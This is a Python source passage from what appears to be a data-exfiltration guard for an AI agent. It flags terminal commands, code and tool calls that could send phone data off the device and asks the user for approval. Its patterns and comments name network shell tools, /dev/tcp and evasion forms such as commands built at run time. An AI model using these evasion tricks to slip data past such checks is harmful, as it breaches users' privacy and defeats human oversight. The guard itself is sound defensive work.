            "-j -n -N -a -S -L -I -P --jobs --max-args --arg-file --sshlogin --results --joblog".split()))
        cmd: List[str] = []
        for x in args[j:]:
            if x.startswith(":::") or x == "---":
                break
            cmd.append(x)
        if cmd:
            return "text", " ".join(cmd), any(argd[j:j + len(cmd)])
        return ("ask", "parallel running commands from its input", None) if fed else None
    if base == "faketime":
        return words(_skip_opts(args, frozenset()) + 1)   # the time, then the command
    if base == "chrt":
        if "-p" in args or "--pid" in args:
            return None
        return words(_skip_opts(args, frozenset()) + 1)   # the priority, then the command
    if base == "taskset":
        if "-p" in args or "--pid" in args:
            return None
        j = _skip_opts(args, frozenset(("-c", "--cpu-list")))
        has_list = any(a in ("-c", "--cpu-list") for a in args[:j])
        return words(j if has_list else j + 1)   # the mask, then the command
    return None


def _code_risk(code: str, base: str = "") -> bool:
    """Whether a program's text uses the network or runs commands."""
    if _netcode(code) or _RE_SHELLOUT.search(code):
        return True
    return base in ("perl", "ruby", "php") and "`" in code


def _oneliner(base: str, flag: str, code: str, built: bool) -> Optional[str]:
    if built:
        return f"{base} one-liner built at run time"
    return f"{base} one-liner ({flag}) that uses the network or runs commands" if _code_risk(code, base) else None


def _pkg_match(base: str, args: List[str], argd: List[bool]) -> Optional[str]:
    """A package tool asks when it fetches from an address the text names, when it runs code it downloads (npx...), or
    when it is pointed at another index. Installing a named package from the tool's usual index does not ask."""
    opts = set(_PKG_OPTS)
    if base in ("pip", "pip3", "pipx", "uv", "uvx"):
        opts |= {"-i", "-f"}
    if base == "gem":
        opts |= {"-s"}
    sub = next((a for a in args if not a.startswith("-")), "")
    if base in ("npx", "uvx") or (base in ("pnpm", "yarn") and sub in ("dlx", "exec")) \
            or (base == "npm" and sub in ("exec", "x", "init", "create")) or (base == "pipx" and sub == "run") \
            or (base == "uv" and sub in ("tool", "run")):
        return f"{base} {sub}".strip() + " (downloads and runs code)"
    for a in args:
        o = a.split("=", 1)[0]
        if o in opts:
            return f"{base} with a different package source ({o})"
        if "://" in a or a.startswith(("git+", "github:", "gitlab:", "bitbucket:", "git@")):
            return f"{base} fetching from an address"
        if base in ("npm", "yarn", "pnpm") and sub in ("install", "i", "add", "update") \
                and re.match(r"^[\w.-]+/[\w.-]+(?:#.*)?$", a) and not a.startswith((".", "/")):
            return f"{base} installing from a repository"
        if base == "go" and sub in ("get", "install", "run", "mod", "generate", "build") \
                and re.match(r"^[\w-]+(?:\.[\w-]+)+/", a):
            return f"go fetching {a.split('@')[0][:40]}"
    return None


def _fed_code(base: str, body: List[str], piped: bool) -> Optional[str]:
    """A program that reads its code from input: when the code is a heredoc we can read, ask only if it is risky."""
    if body and not piped and not _code_risk("\n".join(body), base):
        return None
    return f"{base} reading code from input"


def _match_cmd(cmd: _Cmd, whole: str, depth: int) -> Optional[str]:
    w, d, piped, body = cmd
    if depth > MAX_DEPTH:
        return "commands nested too deeply to read"   # fail closed
    i, split = _strip_wrappers(w, d)
    for x in w[:i]:   # `PAGER='curl ...' man ls`: a variable that names a program some command runs
        name, _eq, val = x.partition("=")
        if _ASSIGN.match(x) and name in _ENV_RUNS and val and not _PLAIN_PAGER.match(val):
            return f"{name} set to a program to run"
    if split is not None:   # env -S 'text'
        return "command built at run time" if split[1] else _match_text(split[0], depth + 1)
    if i >= len(w):
        return None
    word = w[i]
    base = _base(word)
    args, argd, inline = _split_args(w[i + 1:], d[i + 1:])
    fed = piped or inline   # the command reads text from a pipe or a heredoc
    # xargs hands its input to the command: a shell or interpreter it runs may get code (or a script name) that way
    repl = {"{}"}
    xa = False
    for k, x in enumerate(w[:i]):
        if _base(x) == "xargs":
            xa = True
        if x == "-I" and k + 1 < len(w):
            repl.add(w[k + 1])
        elif x.startswith("-I") and len(x) > 2:
            repl.add(x[2:])
    # a command word built at run time, or a pattern that picks the name: `$(printf curl)`, `${C:-curl}`, `c?rl`, `cur[l]`
    if d[i] and not _HOME_PATH.match(word):
        return "command built at run time"
    if any(ch.isalpha() for ch in word) and word not in ("[", "[[") and not word.startswith("-") \
            and (re.search(r"[*?\[]", word) or _BRACES.search(word)) and _pattern_may_be_risky(word):
        return "command name chosen by a pattern"
    if base in _NET_WORDS:
        return f"network command {base}"
    if base == "gh":
        sub = None
        j = 0
        while j < len(args):
            if args[j] in ("-R", "--repo"):
                j += 2
            elif args[j].startswith("-"):
                j += 1
            else:
                sub = args[j]
                break
        return None if sub is None or sub in _GH_LOCAL else f"gh {sub} (GitHub CLI)"
    if base == "git":
        j = 0
        while j < len(args):
            a = args[j]
            if a in ("-c", "--config-env") and j + 1 < len(args):
                key, _eq, val = args[j + 1].partition("=")
                if _GIT_CFG_RUNS.match(key.strip()) or val.lstrip().startswith("!"):
                    return f"git -c {key.strip()[:40]} (setting that runs a program)"
            if a in _GIT_OPT_ARG:
                j += 2
            elif a.startswith("-"):
                j += 1
            else:
                if a == "submodule":   # `git submodule status` only looks; update, init, add, sync and foreach fetch or run
                    rest = [x for x in args[j + 1:] if not x.startswith("-")]
                    return None if not rest or rest[0] in ("status", "summary", "absorbgitdirs") else "git submodule " + rest[0][:20]
                if a == "difftool":   # runs the configured diff program; -x / --extcmd names any program
                    return "git difftool -x (runs a program)" if any(
                        x == "-x" or x.startswith(("-x", "--extcmd")) for x in args[j + 1:]) else None
                return f"git {a}" if a in _GIT_SENDS else None
        return None
    if base == "eval":
        return "eval (runs built text)"
    if base in ("source", "."):
        if args and not argd[0] and not fed and _PLAIN_PATH.match(args[0]):
            return None   # a local script: what it holds is not looked at
        return f"{base} of something that is not a plain local path"
    if base == "alias":
        for a in args:
            if "=" in a:
                r = _match_text(a.split("=", 1)[1], depth + 1)
                if r:
                    return f"alias for {r}"
        return None
    if base == "runuser" and ("--" in args or "-u" in args or "--user" in args):   # runuser -u USER -- command
        k = args.index("--") + 1 if "--" in args else (args.index("-u") if "-u" in args else args.index("--user")) + 2
        return _match_cmd((args[k:], argd[k:], False, []), whole, depth + 1) if k < len(args) else None
    if base in _EXEC_WRAP:
        got = _unwrap(base, args, argd, fed)
        if got is None:
            return None
        kind, payload, extra = got
        if kind == "ask":
            return payload
        if kind == "text":
            return "command built at run time" if extra else _match_text(payload, depth + 1)
        return _match_cmd((payload, extra, False, []), whole, depth + 1)
    if base in _PKG:
        return _pkg_match(base, args, argd)
    if base in _MEDIA:
        for j, a in enumerate(args):
            if _URLISH.search(a) or (a == "-i" and j + 1 < len(args) and argd[j + 1]):
                return f"{base} reading or writing a network address"
        return None
    if base in _SHELLS or base in ("su", "runuser"):
        # `bash -c '...'`: look inside the text it runs; a text built from a substitution that decodes something is asked
        if xa and args and re.match(r"^-[a-zA-Z]+$", args[-1]) and "c" in args[-1][1:]:
            return f"xargs handing its input to {base} -c as code"   # `xargs -a f bash -c`: the lines are the commands
        for j, a in enumerate(args):
            if a == "--":
                break
            if re.match(r"^-[a-zA-Z]+$", a) and "c" in a[1:] and j + 1 < len(args):
                if xa and args[j + 1].strip().startswith(tuple(repl) + ("$1", '"$1"', "$@", '"$@"')):
                    return f"{base} -c running text from xargs input"
                r = _match_text(args[j + 1], depth + 1)
                if r:
                    return r
                if argd[j + 1] and _DECODE.search(whole):
                    return f"text decoded and run by {base} -c"
                return None
        if base in ("su", "runuser"):
            return None
        stdin_script = any(re.match(r"^-[a-zA-Z]*s[a-zA-Z]*$", a) for a in args if a.startswith("-") and a != "--")
        pos = [a for a in args if not a.startswith("-") or a == "-"]
        if stdin_script and pos and not _inline_script(pos[0]):
            pos = []   # `bash -s arg`: the words after -s are arguments, the script comes from input
        first = pos[0] if pos else None
        if first is not None and (_inline_script(first) or (xa and first in repl)):
            if body and not piped and _PROCSUB not in first:
                return _match_text("\n".join(body), depth + 1)   # `bash /dev/stdin <<EOF`: look at the heredoc
            return f"{base} running code from {'xargs input' if xa and first in repl else 'input'}"
        if (piped or inline) and first is None:
            if body and not piped:
                return _match_text("\n".join(body), depth + 1)   # a heredoc: look at the commands it holds
            return f"text piped into {base}"
        return None
    if _INTERP.match(base):
        j = 0
        while j < len(args):
            a = args[j]
            if a == "-":
                return _fed_code(base, body, piped)
            kind = _LIB_KIND.get(base)
            lib = _lib_arg(kind, args, j) if kind else None
            if lib is not None:
                if _LIB_NET[kind].match(lib[0]):
                    return f"{base} loading the network library {lib[0][:30]}"
                j += lib[1]
                continue
            if a == "-m" and j + 1 < len(args):
                mod = args[j + 1]
                if mod == "pip":
                    return _pkg_match("pip", args[j + 2:], argd[j + 2:])
                return f"{base} -m {mod}" if mod.startswith(_NET_MODULES) else None
            if a.startswith("-m") and len(a) > 2:
                return f"{base} {a}" if a[2:].startswith(_NET_MODULES) else None
            if a.startswith(("--eval=", "--print=", "--exec=")):
                return _oneliner(base, a.split("=", 1)[0], a.split("=", 1)[1], argd[j])
            if a.startswith("-"):
                if _ONELINER.match(a):
                    if j + 1 >= len(args):
                        return f"xargs handing its input to {base} {a} as code" if xa else None
                    return _oneliner(base, a, args[j + 1], argd[j + 1])
                j += 2 if a in ("-W", "-X", "--require") else 1
                continue
            if _inline_script(a) or (xa and a in repl):   # /dev/stdin, /proc/self/fd/0, <(...): code, not a local file
                return _fed_code(base, body, piped) if body and not piped and _PROCSUB not in a \
                    else f"{base} running code from input"
            return None   # a script file: its contents are not looked at
        return _fed_code(base, body, piped) if fed else None
    if base in ("sqlite3", "sqlite"):
        text = " ".join(args + body)
        if re.search(r"(?:^|[\s;'\"])\.(?:shell|system|load|cd|open\s+\S*\|)\b|\.(?:import|output|once)\s+['\"]?\|", text) \
                or any(_PROCSUB in a for a in args):
            return f"{base} command that runs a program"
        return f"{base} reading commands from input" if piped and not body else None
    if base in _VI:
        if fed or _vim_runs_program(args):
            return f"{base} running commands given to it"
        return None
    if base in ("emacs", "emacsclient"):
        return f"{base} evaluating code" if any(
            re.match(r"^-{1,2}(?:eval|funcall|f|batch|l|load|script)\b", a) for a in args) else None
    if base == "gdb":
        return "gdb running commands" if fed or any(re.match(
            r"^(?:-ex|--ex|-iex|-ix|-x|--command|--eval-command|--init-eval-command|--init-command|-batch|--batch)", a)
            for a in args) else None
    if base in ("less", "more", "most", "pager"):
        return f"{base} given a command to run" if _less_runs_program(args) else None
    if base in ("man", "info", "apropos", "whatis"):
        return f"{base} with a pager or browser program" if _man_runs_program(args) else None
    if base in ("tar", "bsdtar", "star"):
        return "tar running a program" if _tar_runs_program(args) else None
    if base in ("find", "fd", "fdfind"):
        for j, a in enumerate(args):
            if a in ("-exec", "-execdir", "-ok", "-okdir", "-x", "-X", "--exec", "--exec-batch"):
                inner: List[str] = []
                for b in args[j + 1:]:
                    if b in (";", "+"):
                        break
                    inner.append(b)
                if inner:
                    r = _match_cmd((inner, [False] * len(inner), False, []), whole, depth + 1)
                    if r:
                        return f"{base} {a} {r}"
        return None
    if base in ("awk", "gawk", "mawk", "busybox-awk"):
        if any(("system(" in a or "/inet/" in a or _RE_AWK_PIPE.search(a)) for a in args):
            return f"{base} program that runs commands"
        return None
    if base == "am" and args and args[0] in ("start", "broadcast", "startservice", "start-activity"):
        return f"am {args[0]}"
    if base == "cmd" and args and args[0] in ("activity", "package"):
        return f"cmd {args[0]}"
    if base == "service" and args and args[0] == "call":
        return "service call"
    if base == "monkey":
        return "monkey"
    if base == "openssl" and args and args[0] == "s_client":
        return "openssl s_client"
    return None


def _match_text(text: str, depth: int = 0) -> Optional[str]:
    if depth > MAX_DEPTH:
        return "commands nested too deeply to read"   # fail closed
    t = text[:MAX_SCAN]
    if re.search(r"/dev/(?:tcp|udp)/", t):
        return "/dev/tcp or /dev/udp"
    for cmd in _parse(t):
        r = _match_cmd(cmd, t, depth)
        if r:
            return r
    return None


_RE_NETCODE = re.compile(
    # words that stand alone (`socket_path` or `n_requests` are not them)
    r"\b(?:urllib\d?|requests|grequests|http\.client|http\.server|httplib|httpx|aiohttp|socket|socketserver|ssl|urlopen"
    r"|ftplib|smtplib|telnetlib|poplib|imaplib|nntplib|paramiko|asyncssh|pycurl|pexpect|websockets?|xmlrpc|webbrowser"
    r"|open_connection|start_server|create_connection|create_server|XMLHttpRequest|IO::Socket|LWP|open-uri"
    r"|file_get_contents|fsockopen|curl_init|child_process|hermes_tools|web_search|web_extract|send_message|__import__"
    r"|importlib|ctypes|cffi|pty|multiprocessing\.connection)\b"
    r"|\b(?:from|import)\s+http\b"
    # the subprocess family, with no word boundary: asyncio.create_subprocess_exec, os.popen, posix_spawn, check_output
    r"|subprocess|popen|posix_spawn|getoutput|getstatusoutput|check_output|check_call"
    r"|\bos\.(?:system|exec\w*|spawn\w*|fork\w*|startfile)|\bpty\.spawn"
    r"|\b(?:system|exec[lv]\w*|spawn[lv]\w*)\s*\("
    r"|\bfetch\s*\(|\bexec\s*\(|\beval\s*\(|net\.connect|Net::|node:(?:https?|net)"
    r"|require\(\s*['\"`](?:node:)?(?:https?|http2|net|tls|dgram|dns|child_process|cluster|worker_threads)"
    r"|\bimport\s*\(\s*(?:['\"`](?:node:)?(?:https?|http2|net|tls|dgram|dns|child_process|cluster|worker_threads)|[^'\"`\s)])"
    r"|\bfrom\s+['\"](?:node:)?(?:https?|http2|net|tls|dgram|dns|child_process)['\"]|https?\.(?:get|request)"
    r"|\burlretrieve|\bcurl_exec|\bstream_socket_client|\bSoapClient|\bget_headers\b",
    re.I)
# A call that reads from a web address: PHP `fopen("http://...")`, pandas `read_csv("https://...")`, `urlopen(...)`, `imread(...)`.
_RE_URLREAD = re.compile(
    r"\b(?:fopen|readfile|copy|file|include|include_once|require|require_once|simplexml_load_file|parse_ini_file|getimagesize"
    r"|imagecreatefrom\w+|SplFileObject|opendir|fsockopen|pfsockopen|read_\w+|loadtxt|genfromtxt|load\w*|download\w*"
    r"|VideoCapture|imread|wget|Request|from_url|get|post|put|delete|head|request|open|fetch|urlopen)\s*\(?\s*[rRbBuUfF]{0,2}"
    r"['\"`]\s*(?:https?|ftps?|sftp|s3|gs|ssl|tls|tcp|udp)://", re.I)
# A pandas-style reader plus a web address anywhere in the code (`url = ...; pd.read_csv(url)`).
_RE_READER = re.compile(r"\bread_(?:csv|json|html|excel|parquet|table|xml|fwf|feather|orc|stata|sas|spss|pickle|hdf|clipboard)\s*\(")
_RE_ANYURL = re.compile(r"(?:https?|ftps?|s3|gs)://", re.I)
# `from os import system as s`: a process call imported under a name this file's other patterns cannot see.
_RE_FROM_OS = re.compile(r"\bfrom\s+(?:os|posix|nt)\s+import\s+(\([^)]*\)|[^\n;]*)")
_OS_RUNS = re.compile(r"\b(?:system|popen|exec\w*|spawn\w*|fork\w*|startfile|posix_spawn\w*|kill|killpg)\b|\*")


def _netcode(text: str) -> bool:
    """Whether code (Python, PHP, JavaScript...) uses the network, runs a program, or reads a web address."""
    t = text[:MAX_SCAN]
    if _RE_NETCODE.search(t) or _RE_URLREAD.search(t):
        return True
    if _RE_READER.search(t) and _RE_ANYURL.search(t):
        return True
    return any(_OS_RUNS.search(m.group(1)) for m in _RE_FROM_OS.finditer(t))


# A program that starts another program (perl, ruby, php, node, lua one-liners; Python is covered above).
_RE_SHELLOUT = re.compile(r"\b(?:system|exec[a-z]*|shell_exec|passthru|proc_open|spawn[a-z]*|fork)\b|os\.execute|io\.popen|%x[\[{(]")
_RE_URL = re.compile(r"https?://", re.I)

_IF_URL = frozenset({"vision_analyze", "video_analyze"})   # a web address in the call sends the fetch out
_PERSIST = frozenset({"memory", "skill_manage"})   # text saved here is read by other chats
# THE ALLOWLIST. In a chat that has read phone data EVERY tool asks except these (and the few special cases in `classify`:
# terminal and execute_code by their text, process_manage by action, memory by action, vision by address). A tool this list
# does not name asks, so a tool added to Hermes later, a plugin's or an MCP server's, asks until someone decides it
# stays on the device. Each name here sends nothing out:
#   phone_data, phone_app (the app's own hidden screen), canvas, find_chats, openui_reference: this plugin's tools, local
#   read_file, write_file, patch, search_files: the phone's files only
#   todo, todo_list: the chat's task list; clarify: asks the user a question
#   skill_view, skills_list: read installed skills; session_search: the local chat database
#   tool_search, tool_describe: Hermes's local tool registry
# Not on it, decided to ask: kanban_* (boards other agents read), ha_* (a Home Assistant server), feishu_*, yb_*,
# discord*, spotify_*, manage_connections, manage_catalog, cronjob_manage, delegate_task, image/video_generate,
# text_to_speech, computer_use, browser_*, web_*, send_*, mcp_*, read_terminal and the other desktop tools.
_QUIET = frozenset({"phone_data", "phone_app", "canvas", "find_chats", "openui_reference", "clarify", "todo", "todo_list",
                    "read_file", "write_file", "patch", "search_files", "skill_view", "skills_list", "session_search",
                    "tool_search", "tool_describe"})


def _calls(tool_name: Any, args: Any) -> Iterator[Tuple[str, Dict[str, Any]]]:
    """The tool calls inside one call: Hermes's Tool Search bridge (`tool_call`) can carry several."""
    if tool_name == "tool_call" and isinstance(args, dict) and isinstance(args.get("calls"), list):
        for c in args["calls"]:
            if isinstance(c, dict) and c.get("name"):
                inner = c.get("arguments")
                yield str(c["name"]), inner if isinstance(inner, dict) else {}
        return
    yield str(tool_name or ""), args if isinstance(args, dict) else {}


def command_match(text: str) -> Optional[str]:
    """The name of the pattern when a shell command (a pipeline, `bash -c '...'`, `$(...)`...) can send data out."""
    return _match_text(text)


def command_sends_out(text: str) -> bool:
    return command_match(text) is not None


def code_match(text: str) -> Optional[str]:
    """The pattern name when a script given to execute_code (Python) uses the network or runs commands. The text is
    read as Python, never as shell: `host = 1` is only an assignment."""
    if _netcode(text):
        return "code that uses the network or runs commands"
    return None


def code_sends_out(text: str) -> bool:
    return code_match(text) is not None


def _first_text(a: Dict[str, Any], *keys: str) -> str:
    for k in keys:
        v = a.get(k)
        if isinstance(v, str) and v:
            return v
    return ""


def _saved_text(a: Dict[str, Any]) -> str:
    """The text a memory or skill call would save."""
    ops = a.get("operations")
    parts = [_first_text(o, "content", "new_text", "file_content") for o in ops if isinstance(o, dict)] \
        if isinstance(ops, list) else []
    parts.append(_first_text(a, "content", "new_text", "file_content", "new_string", "description"))
    return " | ".join(p for p in parts if p)


def classify(name: str, a: Dict[str, Any]) -> Optional[Tuple[str, str, str]]:
    """None when the call sends nothing out, else (tool name, what to show the user, the pattern that matched)."""
    if name in _QUIET:
        return None
    if name == "terminal":
        cmd = _first_text(a, "command", "code")
        why = command_match(cmd)
        return (name, cmd, why) if why else None
    if name == "execute_code":
        code = _first_text(a, "code", "command")
        why = code_match(code)
        return (name, code, why) if why else None
    if name == "process_manage":
        act = str(a.get("action") or "")
        if act in ("write", "submit"):   # sends text to a running background shell or program
            return name, f"{act} {_first_text(a, 'data')}", f"process_manage {act} (text typed into a running process)"
        return None
    if name in _PERSIST:
        act = str(a.get("action") or "")
        if name == "memory" and act in ("remove", "delete", "list", "read", "get"):
            return None
        return name, f"{act} {_saved_text(a)}".strip(), f"{name} (saves text that other chats can read)"
    if name in _IF_URL:
        return (name, "", f"{name} with a web address") if any(
            isinstance(v, str) and _RE_URL.search(v) for v in a.values()) else None
    if not name:
        return None
    # Fail closed: any other tool may reach outside the device (see _QUIET).
    return name, _first_text(a, "url", "query"), f"tool {name} (not known to stay on the device)"


def _flat(s: str) -> str:
    return " ".join(s.split())


def _clip(s: str) -> str:
    """The start and the end of a long text, so padding in the middle can't hide what is at the end."""
    if len(s) <= MAX_SHOWN:
        return s
    h = MAX_SHOWN // 2
    return f"{s[:h]} … ({len(s)} characters, middle not shown) … {s[-h:]}"


def ask_text(name: str, shown: str, why: str = "") -> str:
    s = _clip(_flat(shown))
    tag = f"Matched: {why}. " if why else ""
    if name in _PERSIST:
        return ("This chat has read data from your phone, and the agent wants to save text where other chats can read it, "
                "which would carry phone data into them. Allow only if the text holds nothing from your phone. "
                f"{tag}It would save: {s or name}")
    what = f"the tool {name}" if not s else (f"the command: {s}" if name == "terminal" else f"{name}: {s}")
    return ("This chat has read data from your phone, and the agent wants to run something that can send data out. "
            f"Allow only if you asked for it. {tag}It would run {what}")


def check(tool_name: Any, args: Any, ids: Any) -> Optional[dict]:
    """A pre_tool_call directive asking the user, or None. The ask is a fresh one every time (new rule_key).
    A chat known by one of its ids gets the others added, so a resume or a compression keeps it marked."""
    ids = _norm(ids)
    if not has_read(ids):
        return None
    adopt(ids)
    for name, a in _calls(tool_name, args):
        hit = classify(name, a)
        if hit is not None:
            return {"action": "approve", "message": ask_text(*hit), "rule_key": "phone_read_out:" + secrets.token_hex(8)}
    return None
